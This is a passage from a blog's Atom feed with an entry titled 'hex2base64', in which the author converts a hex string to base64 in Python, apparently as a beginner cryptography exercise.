&lt;&lt; 3)</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;

&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>hex2base64</title>
    <link href="http://im0use.github.io/2022/05/16/hex2base64/"/>
    <id>http://im0use.github.io/2022/05/16/hex2base64/</id>
    <published>2022-05-16T14:43:16.000Z</published>
    <updated>2022-05-29T01:03:20.189Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><p>I use Python to complete this play. If you don’t have it, you can try to download it and enjoy it.</p><p>Given the hex string, hex string mean the base16 encode. base16 make each eight bit turn to two hex, then convert to three characters.</p><ul><li>use <code>bytes.fromhex</code> to unhexlify</li><li>then use b64encode in <code>base64</code> module</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">data = <span class="string">'49276d206b696c6c696e6720796f757220627261696e206c696b65206120706f69736f6e6f7573206d757368726f6f6d'</span></span><br><span class="line">data_byte = <span class="built_in">bytes</span>.fromhex(data)</span><br><span class="line">data_b64encode = base64.b64encode(data_byte)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f'<span class="subst">{data_byte=}</span>'</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f'<span class="subst">{data_b64encode=}</span>'</span>)</span><br></pre></td></tr></table></figure><p>Certainly, we want to write small program to use in the future.</p><p>Then use some tricks to increase skill about module.</p><ul><li>def: def mean create a function to use repeatedly.</li><li><code>__name__=="__main__"</code>: create a alone environment.</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b16decode, b64encode</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex2bas64</span>(<span class="params">data_hex: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">return</span> b64encode(b16decode(data_hex, casefold=<span class="literal">True</span>))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    data_hex = <span class="string">'49276d206b696c6c696e6720796f757220627261696e206c696b65206120706f69736f6e6f7573206d757368726f6f6d'</span></span><br><span class="line">    data_byte = <span class="built_in">bytes</span>.fromhex(data_hex)</span><br><span class="line">    b64_data = hex2bas64(data_hex)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f'<span class="subst">{data_byte = }</span>'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f'<span class="subst">{b64_data = }</span>'</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;

&lt;p&gt;I use Python to complete this play. If you don’t have it, you can try to download it and enjoy it.&lt;/p&gt;
&lt;p&gt;Given </summary>
      
    
    
    
    
  </entry>
  
</feed>
